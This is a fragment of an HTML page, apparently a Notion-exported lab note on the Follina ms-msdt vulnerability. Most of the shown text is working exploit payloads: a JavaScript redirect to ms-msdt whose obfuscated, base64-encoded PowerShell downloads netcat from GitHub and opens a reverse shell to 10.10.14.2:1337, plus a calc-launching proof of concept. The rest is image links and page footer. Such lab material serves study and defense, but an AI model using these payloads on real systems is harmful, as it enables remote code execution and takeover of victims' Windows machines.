+<pre><code>html_payload = f"""&lt;script&gt;location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\\""; //"""
+</code></pre>
+<pre><code class="language-bash">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('calc'))i/../../../../../../../../../../../../../../Windows/system32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
+&lt;/script&gt;</code></pre>
+<p>simulations.ps1</p>
+<p class="figure"><a class="img-link" href="follina/untitled-69.png"><img src="follina/untitled-69.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-70.png"><img src="follina/untitled-70.png" alt="Untitled" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
